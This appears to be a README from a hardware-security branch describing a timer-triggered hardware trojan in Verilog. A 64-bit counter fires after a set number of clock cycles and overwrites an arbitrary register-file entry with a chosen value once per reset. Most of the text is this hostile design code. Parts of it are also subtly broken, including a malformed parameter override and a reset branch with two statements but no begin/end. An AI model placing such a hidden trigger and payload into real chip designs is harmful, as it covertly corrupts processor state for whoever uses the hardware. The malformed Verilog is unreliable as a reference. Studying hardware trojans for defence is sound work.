# Timer Attack Trojan

This branch houses a basic timer attack trojan which can update a register after an arbitrary number of clock cycles.

## Trigger

A timer module is instantiated in the register file which will throw the trigger high when the a set number of clock cycles have passed.

```verilog
  input did_trigger;
  output reg trigger;
  output [REG_DATA_WIDTH - 1 : 0] trojan;
  output [REG_SEL_BITS - 1:0] trojan_reg;

  localparam TIMER_WIDTH = 64;
  // Trigger trojan after 10 seconds on a 50MHz clock
  localparam TIMER_TRIGGER_VALUE = 500000000;

  // (...)

  reg [TIMER_WIDTH - 1:0] timer = 0;

  // (...)

  always @(*) begin
    trigger = timer >= TIMER_TRIGGER_VALUE & ~did_trigger;
  end

  always @(posedge clock) begin
    if(reset == 1)
      timer <= 0;
    else
      timer <= timer + 1;
  end
```

## Payload

The register file is modified to include the timer module and use the trigger to update an arbitrary register. Once the trojan payload has been deployed, the did_trigger signal will be set high disabling the trojan until the next reset.

```verilog
timer #(
  REG_DATA_WIDTH(REG_DATA_WIDTH),
  REG_SEL_BITS(REG_SEL_BITS)
) timer_unit (
  .clock(clock),
  .reset(reset),
  .trigger(trojan_trigger),
  .did_trigger(did_trigger),
  .trojan(trojan_value),
  .trojan_reg(trojan_reg)
);

always @(posedge clock)
  if(reset==1)
      register_file[0] <= 0;
      did_trigger <= 0;
    else
      if(trojan_trigger == 1) begin
        register_file[trojan_reg] <= trojan_value;
        did_trigger <= 1;
      end
      if (wEn & write_sel != 0)
        register_file[write_sel] <= write_data;
```
